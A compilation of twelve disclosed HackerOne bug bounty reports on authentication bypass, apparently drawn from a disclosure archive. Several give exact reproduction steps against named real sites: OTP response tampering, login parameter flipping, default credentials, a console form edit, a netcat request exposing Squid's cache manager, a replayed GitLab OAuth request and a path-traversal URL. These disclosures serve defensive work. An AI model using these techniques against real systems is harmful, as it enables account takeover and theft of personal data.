# Authentication Bypass Using an Alternate Path or Channel

_12 reports — High/Critical, disclosed_

### [Ability to Add and Verify Uncontrolled Mobile Numbers Leading to Account Takeover (ATO)](https://hackerone.com/reports/2762462)

- **Report ID:** `2762462`
- **Severity:** Critical
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** MTN Group
- **Reporter:** @trev0ck
- **Bounty:** - usd
- **Disclosed:** 2025-03-04T13:30:06.992Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
A critical vulnerability was identified in the OTP verification process on the shop.mtn.ng platform, which allows attackers to add and verify mobile numbers that they do not control. By tampering with the OTP verification request, an attacker can link a victim's mobile number to their account. This leads to an Account Takeover (ATO) scenario where the attacker gains full access to the victim's account without owning or controlling the victim's phone number.

## Steps to Reproduce

###  Initiate OTP Request
- Begin the login or registration process on the platform.
- Enter a valid mobile number (MSISDN) and request an OTP.

### Capture OTP Verification Request
- Use a proxy tool like **Burp Suite** or **Caido** to intercept the OTP verification request when submitting the OTP.
- The intercepted request will look like this

```http
POST /mtn_otp/index/verification/ HTTP/2
Host: shop.mtn.ng
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

ajax=1&action=verifyotp&msisdn=██████&otp=███████
```
### Manipulate Server Response

- Upon capturing the request, submit an incorrect OTP to receive the server's response

```json
{
  "status": 400,
  "message": "Invalid OTP",
  "msisdn": "█████████",
  "success": false
}
```

Modify the response in the intercepted traffic to indicate a successful verification

```json
{
  "status": 200,
  "message": "success",
  "msisdn": "██████████",
  "success": true
}
```
This will trick the client into thinking that the OTP was successfully verified, even though the OTP is incorrect.

- The manipulated server response now grants full access to the victim's phone number account. Even though the OTP was incorrect, the altered response bypasses the verification, which could allow the attacker to log in as the target user.

## NOTE I do not own this phone number at all and as you can see it is now linked to my account
████████

# Root Cause

- The application fails to protect against the manipulation of the OTP verification response. The server does not perform integrity checks on the response sent back to the client, allowing attackers to alter it and bypass OTP verification entirely.

## Impact

An attacker can exploit this flaw to hijack user accounts by manipulating the OTP verification response. This allows the attacker to

1. Access personal user information such as names, phone numbers, and email addresses.
2. Modify sensitive account settings like passwords, linked emails, and phone numbers.
3. Perform unauthorized actions such as transactions or purchases.
4. Further escalate the attack to other services connected to the victim's account.

---

### [Authentication Bypass Leads To  Complete Account TakeveOver on ██████████](https://hackerone.com/reports/1709881)

- **Report ID:** `1709881`
- **Severity:** Critical
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** MTN Group
- **Reporter:** @reachaxis
- **Bounty:** - usd
- **Disclosed:** 2024-09-14T12:48:03.887Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Hello Team,
When an invalid email address/password is entered, the Web Application will not authenticate the user. But nevertheless, it is conceivable for an attacker to get around authentication and log in as anyone else, leading to Complete Account Takeover.

## Steps To Reproduce:
Create Two Test Account (Attacker & Victim)

Using attacker's account, login at ███████ 

1. Capture request with Burp. 
2. Without sending request to "Burp Repeater",  modify attacker's email to victim's email. For example REDACTED+██████ to  REDACTED+█████. 
3. Change the param `value:false`, to  `value:true,` and click send. 
4. Notice, attacker has successfully bypassed the authentication to login as the victim without any interaction.

## Supporting Material/References:
███

##Request
```
POST /app/login HTTP/1.1
Host: mtnmobad.mtnbusiness.com.ng
Cookie: █████
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.27 Safari/537.36
....snip....
Connection: close
{
	"params":{
		"updates":[
		{
			"param":"user",
			"value":{
				"userEmail":"REDACTED+██████",
				"userPassword":"#######"
				},
				"op":"a"
				},
				{
					"param":"gateway",
					"value":true,
					"op":"a"
					}
					],
....more....
```

##Response
```
HTTP/1.1 200 OK
Server: nginx
....snip....
{
	"error":false,
	"response":{
		"id":"/703",
	"name":"Victim ******",
	"type":"Account",
	"level":0,
	"notes":{
		},
....more....
```

██████
  
* [attachment / reference]
1. █████
2. ██████

## Impact

Supposing there are 100,000 users available, a malicious actor will enumerate all 100,000 emails for all users to achieve a mass account takeover. Additionally, an attacker can lockdown an account, delete an account, change account info, and perform large data leaks.

**Summary (researcher):**

**The application's backend logic placed too much trust on the login information submitted by the user which allowed a remote attacker to bypass authentication and perform account takeover for all users with the wrong password. More details can 
be found here**
https://medium.com/@reachaxis/how-i-took-over-100-000-user-account-without-knowing-their-password-part-one-7d965ae9e47a

---

### [Account Takeover via Authentication Bypass in TikTok Account Recovery](https://hackerone.com/reports/2443228)

- **Report ID:** `2443228`
- **Severity:** Critical
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** TikTok
- **Reporter:** @fl4w
- **Bounty:** 12000 usd
- **Disclosed:** 2024-07-13T00:36:28.446Z
- **CVE(s):** -

**Summary (team):**

An improper authentication mechanism in TikTok's account recovery process could have been used for account takeovers on Android devices. There was no evidence of exploitation and this vulnerability has now been completely fixed. We thank @xtt0k for reporting this to our team and confirming its remediation.

**Summary (researcher):**

I identified a critical vulnerability in one of TikTok's endpoints that permitted unauthorized changes to user accounts due to improper parameter handling. This flaw could have allowed a TikTok account to be taken over by knowing the account username. I appreciate TikTok's swift action in resolving this issue and their generous bounty.

---

### [Authentication bypass in ████████](https://hackerone.com/reports/1747146)

- **Report ID:** `1747146`
- **Severity:** Critical
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** MTN Group
- **Reporter:** @roland_hack
- **Bounty:** - usd
- **Disclosed:** 2022-12-02T13:00:21.805Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
In a nutshell, an authentication bypass exploits weak authentication mechanisms to allow a hacker to access your systems and data.In a nutshell, an authentication bypass exploits weak authentication mechanisms to allow a hacker to access your systems and data

## Steps To Reproduce:

  1.I was going to the site: █████ and on the home page I clicked on personal and the site redirected me to another site which is: ██████████ and on this site on which I was redirected I saw "link your NIN" and I went to this site and after listing I found an impressive thing which is the Tiny filemanager and to authenticate myself I bypass it with default credentials to access it.
The default credentials are: Login Details: ████/████ | user/12345
and I had access to the panel and I had privileges like modify, upload, delete
## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

## Impact

The impact of authentication vulnerabilities can be very severe. Once an attacker has either bypassed authentication or has brute-forced their way into another user's account, they have access to all the data and functionality that the compromised account has.

---

### [Mass Accounts Takeover Without any user Interaction  at https://app.taxjar.com/ ](https://hackerone.com/reports/1685970)

- **Report ID:** `1685970`
- **Severity:** High
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** Stripe
- **Reporter:** @mr_asg
- **Bounty:** 13000 usd
- **Disclosed:** 2022-10-19T19:05:50.033Z
- **CVE(s):** -

**Summary (team):**

@mr_asg discovered an improper access control issue in TaxJar. This could have allowed for account takeover using the email change functionality. The vulnerability was caused by not correctly validating whether or not the reset password token was connected to the user being reset and was resolved by relying on the user fetched from the reset password token itself instead of the account ID provided in the URL.

**Summary (researcher):**

I discovered an IDOR in the Accountant Access form in Taxjar. This could have allowed an attacker to take over any user's account. The vulnerability was caused by  manipulating the user's number in the POST request to `/accounts/<ACCOUNT_NUMBER>` with adding the user's email parameter carrying the attacker's email in the payload data in the request, which causing changing the email in the account associated with the number that was manipulated .
And by a Proof Of Concept Python script, I made a loop in which the account number and the attacker’s email were changed every time, which demonstrated the attacker’s ability to carry out the attack against a large number of accounts .
The Write-up here : https://medium.com/@mrasg/mass-account-takeover-in-stripes-taxjar-a-one-click-exploit-6fd13bb75f04

---

### [Mass Account Takeover at https://app.taxjar.com/ - No user Interaction](https://hackerone.com/reports/1581240)

- **Report ID:** `1581240`
- **Severity:** Critical
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** Stripe
- **Reporter:** @beerboy_ankit
- **Bounty:** - usd
- **Disclosed:** 2022-07-11T13:50:48.954Z
- **CVE(s):** -

**Summary (team):**

@beerboy_ankit discovered an IDOR in the user invite link in Taxjar. This could have allowed an attacker to take over a user's account. The vulnerability was caused by a leaked token in the delete invitation request feature and resolved by using the invitation ID instead of the token to look up the user’s invite when deleting an invitation. Validation was added to ensure the ID belongs to the user’s organization.

---

### [Unauthorized access to employee panel with default credentials.](https://hackerone.com/reports/1063298)

- **Report ID:** `1063298`
- **Severity:** High
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** U.S. General Services Administration
- **Reporter:** @7azimo
- **Bounty:** - usd
- **Disclosed:** 2021-11-13T20:46:19.578Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello, 
When hunting for your web application.

I have managed to go https://cars.fas.gsa.gov/cars/cars and get displayed with a form.
I have already tried to login to Cars and without success.
However i've noticed the loginChk() function and change the value of the form hence bypassing it and logging in succesfuly.

## Steps To Reproduce:


  1. go to https://cars.fas.gsa.gov/cars/cars
  2. type loginChk()  function in console. 
  3. It would return false. 
  4. Now  type in console ( can be opened using F12). 
       document.forms[0].scSelCen.value = "admin"
  5. Now try to login by clicking on CARS button.

## Supporting Material/References:
Navigator used : google chrome.

If you need any additional information. feel free to ask me.

PS :  I think the website went for a maintenance right now.
Even though i didn't use anything of that panel.

## Impact

Any attacker would have the access to admin panel and do whatever he wants.
As i can see , it's a platform for reporting accidents.

---

### [Cache Manager ACL Bypass](https://hackerone.com/reports/824203)

- **Report ID:** `824203`
- **Severity:** Critical
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** Internet Bug Bounty
- **Reporter:** @jeriko_one
- **Bounty:** - usd
- **Disclosed:** 2021-08-26T23:28:49.164Z
- **CVE(s):** CVE-2019-12524

**Vulnerability Information:**

## Summary:
ACL Manager can be bypassed giving non authorized users to squid-internal-mgr.
Possible to bypass other url_regex, but only focused on manager. 

<= Squid-4.7 vulnerable
Silently Fixed in Squid-4.8 
Announce page was allocated, but never made http://www.squid-cache.org/Advisories/SQUID-2019_4.txt As another issue similar to this wasn't fixed 

Patch: http://www.squid-cache.org/Versions/v4/changesets/squid-4-e1e861eb9a04137fe81decd1c9370b13c6f18a18.patch

Assigned: CVE-2019-12524
## Steps To Reproduce:

1) Start squid-4.7
```
./sbin/squid
```

2) Issue the following request replacing <hostname> with the hostname of the server running squid
```
echo -e "GET https://jeriko.one%252f@<hostname>:3128/squid-internal-mgr/active_requests HTTP/1.1\r\n\r\n" |nc <hostname> 3128
```

```
HTTP/1.1 200 OK
Server: squid/4.7
Mime-Version: 1.0
Date: Wed, 18 Mar 2020 23:41:31 GMT
Content-Type: text/plain;charset=utf-8
Expires: Wed, 18 Mar 2020 23:41:31 GMT
Last-Modified: Wed, 18 Mar 2020 23:41:31 GMT
X-Cache: MISS from g64
Transfer-Encoding: chunked
Via: 1.1 g64 (squid/4.7)
Connection: keep-alive

1AF
Connection: 0x5594f78d95f8
	FD 10, read 85, wrote 0
	FD desc: Reading next request
	in: buf 0x5594f7d2e1a4, used 1, free 4011
	remote: 192.168.4.144:38376
	local: 192.168.4.144:3128
	nrequests: 1
uri https://jeriko.one%2f@g64:3128/squid-internal-mgr/active_requests
logType TCP_MISS
out.offset 0, out.size 0
req_sz 84
entry 0x5594f7d2b720/0300000000000000291F000001000000
start 1584574891.149644 (0.000000 seconds ago)
username -


0
```
You should have accessed the active_requests page in the squid-internal-mgr 

## Analysis

When Squid is checking ACLs and it wants to check if a URL is a cache manager
URL it checks the following rule

```
 default_line("acl manager url_regex -i ^cache_object:// +i ^https?://[^/]+/squid-internal-mgr/");
```
When checking if the URL matches the regex the function
ACLUrlStrategy::match will be called. This will get the effectiveRequestUri,
decode it and then try to match it against the regex

```
ACLUrlStrategy::match (ACLData<char const *> * &data, ACLFilledChecklist *checklist)
{
    char *esc_buf = SBufToCstring(checklist->request->effectiveRequestUri());
    rfc1738_unescape(esc_buf);
    int result = data->match(esc_buf);
    xfree(esc_buf);
    return result;
}
```
effectiveRequestUri() will return url.absolute() for methods that aren't
CONNECT and schemes that aren't PROTO_AUTHORITY_FORM

 Looking at Uri::absolute we see that the userInfo is included into the
 absolute uri representation if the protocol is HTTPS

```
             const bool omitUserInfo = getScheme() == AnyP::PROTO_HTTP ||
                                      getScheme() != AnyP::PROTO_HTTPS ||
                                      userInfo().isEmpty();
            if (!omitUserInfo) {
                absolute_.append(userInfo());
                absolute_.append("@", 1);
            }
```
userInfo is set in Uri::parse if the foundHost contains a @ that
the userinfo is extracted and then decoded.
```
        t = strrchr(foundHost, '@');
        if (t != NULL) {
            strncpy((char *) login, (char *) foundHost, sizeof(login)-1);
            login[sizeof(login)-1] = '\0';
            t = strrchr(login, '@');
            *t = 0;
            strncpy((char *) foundHost, t + 1, sizeof(foundHost)-1);
            foundHost[sizeof(foundHost)-1] = '\0';
            // Bug 4498: URL-unescape the login info after extraction
            rfc1738_unescape(login);
        }
```
This is eventually stored in userInfo when calling parseFinish
 parseFinish(protocol, proto, urlpath, foundHost, SBuf(login), foundPort);

This userInfo is the decoded version, therefore special tokens such as ? # /
are possible entries in the userInfo. 

We see now that the URL is decoded twice when checking RegexURL acls.

Let's consider the following example URL to show how we can access
CacheManager due to this double decode flaw.

g64 is the name of my Squid server

https://jeriko.one%252f@g64:3128/squid-internal-mgr/active_requests

First in clientProcessRequest my request will be marked as internal as the
path is /squid-internal-mgr/active_requests, and the url.host and url.port
match the Squid server hostname and port number
```
    if (internalCheck(request->url.path())) {
        if (internalHostnameIs(request->url.host()) && request->url.port() == getMyPort()) {
            debugs(33, 2, "internal URL found: " << request->url.getScheme() << "://" << request->url.authority(true));
            http->flags.internal = true;
```
As it makes it way through ACL checks it'll come against the Manager regex acl

After the call rfc1738_unescape is made my URL is now
"https://jeriko.one/@g64:3128/squid-internal-mgr/active_requests"

Which fails against the Manager regex check

As this decoding didn't change the original URL, when I reach internalStart my
path will match against mgrPfx, giving me access to the cache manager.

The Cache manager has a lot of useful information for anyone who is curious on
what type of traffic is going through a Squid server. It also provides useful
information for someone trying to gain remote code execution over the server
as the cmd active_requests holds a number of in use addresses

## Impact

Bypasses restrictions on squid-internal-mgr. This allows an attacker to gain information on Squid clients, request being made, usernames, peer servers, servers being reversed proxied,  in memory objects, addresses of objects which can be used to break ASLR. 

A list can be found in stat.cc where functions are registered to the Manager.

---

### [Other misconfiguration on Slack Server](https://hackerone.com/reports/1039325)

- **Report ID:** `1039325`
- **Severity:** Critical
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** ImpressCMS
- **Reporter:** @ex1st3nc3_
- **Bounty:** - usd
- **Disclosed:** 2021-01-04T10:39:07.735Z
- **CVE(s):** -

**Summary (team):**

Other misconfiguration on Slack Server

---

### [Ability to bypass email verification for OAuth grants results in accounts takeovers on 3rd parties](https://hackerone.com/reports/922456)

- **Report ID:** `922456`
- **Severity:** High
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** GitLab
- **Reporter:** @cache-money
- **Bounty:** 3000 usd
- **Disclosed:** 2020-10-01T18:13:14.253Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
There's a limitation that requires a validated email before going through the OAuth flow, however this is bypassable. Bypassing this means the target site assumes your email is validated, and actually ends up signing you in with an non-validated email. This behavior can frequently lead to account takeovers in 3rd parties since they often use the email as an identifier, and fold all OAuth/manually created accounts into one. In my example I am going to demonstrate an account takeover on https://laravelshift.com/, however this concept is widely exploitable.

It should also be possible to use this technique to get into internal company using pages that just look for `@domain.com` in the email before allowing them access.

### Steps to reproduce
1) Create a Bitbucket or GitHub account with a random email, and login to https://laravelshift.com/. (We're seeding a victim account).
2) In a different browser, create a new GitLab account with that same email but never confirm it.
3) In that browser, visit LaravelShift and click "Sign in with GitLab", notice you land on a page that states you cannot complete the OAuth grant without validating your email.

Run the following request in Burp replacing your cookies, CSRF token, and state parameter.

```
POST /oauth/authorize HTTP/1.1
Host: gitlab.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 354
DNT: 1
Connection: close
Cookie: [COOKIES]

utf8=%E2%9C%93&authenticity_token=[CSRF TOKEN]&client_id=6dd35c52b02a99eca3454505c4b1f1fa761ad1125bcdccdbc1c290877ef25093&redirect_uri=https%3A%2F%2Flaravelshift.com%2Fauth%2Fgitlab%2Fcallback&state=[STATE VALUE FROM URL]&response_type=code&scope=&nonce=
```
4) Notice the request succeeds with a 302 to LaravelShift with the `code`.
5) Visit that URL and notice you get logged into the victim's account from step 1. This works since the GitLab email is assumed to be trusted and validated.

### Impact

Account takeovers on 3rd parties due to developers assuming GitLab is properly checking validated emails.

### What is the current *bug* behavior?

It's possible to play the `/oauth/authorize` request directly to bypass the `Verify the email address in your account profile before you sign in.` prompt.

### What is the expected *correct* behavior?

The email verification check should be enforced at this step of the process as well.

## Impact

Thanks,
-- Tanner

---

### [Two-factor authentication (2FA) Bypass](https://hackerone.com/reports/708303)

- **Report ID:** `708303`
- **Severity:** Critical
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @offensive-security
- **Bounty:** - usd
- **Disclosed:** 2020-01-15T10:59:14.075Z
- **CVE(s):** -

**Summary (team):**

Bypassing 2FA after activating it on the company forum.

---

### [Admin panel take over | User info leakage | Mass Comprimise](https://hackerone.com/reports/428757)

- **Report ID:** `428757`
- **Severity:** Critical
- **Weakness:** Authentication Bypass Using an Alternate Path or Channel
- **Program:** U.S. Dept Of Defense
- **Reporter:** @bigchonk
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:44:27.421Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

**Summary:** [add summary of the vulnerability]
I'm able to take over the admin panel, allowing me to viewing the entire ticket database's PII (DOD ID, email, name by changing the URL and bypassing authentication
**Description:** [add more details about this vulnerability]

## Steps To Reproduce:
1: Go to
████████?x-app=itsm&x-urlpath=/arsys/shared/login.jsp&x-redir=%2Farsys%2Fforms%2Fedgelb-itsm-ar%2FRKM%253AKnowledgeArticleManager%2FDisplay%2BView%2F%3Feid%3DKBA000000024701%26cacheid%3Ddf8e1567

2: Change URL to 
█████?x-app=itsm&x-urlpath=../../../../../../../../passwd
3) 
LFI fails, click login
4) Enjoy full admin panel access

5 (Leak PII)
In the left hand corner, applications -> quick links -> AR system report console
Bottom left, click run


## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)
Proof of PII:
██████████

Proof of admin panel:
█████████

## Impact

I can steal users DOD IDs, pretty much anything I want because I'm the websites admin
Change tickets
Change user info
Change permission
Steal PII

---
